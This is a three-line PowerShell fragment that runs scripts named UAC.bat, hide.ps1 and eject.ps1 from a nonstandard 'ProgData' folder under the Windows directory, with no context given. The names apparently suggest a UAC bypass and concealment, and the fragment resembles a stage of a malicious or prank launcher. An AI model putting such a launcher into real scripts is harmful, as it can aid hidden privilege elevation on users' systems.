&"$Env:WinDir\ProgData\UAC.bat"
&"$Env:WinDir\ProgData\hide.ps1"
&"$Env:WinDir\ProgData\eject.ps1"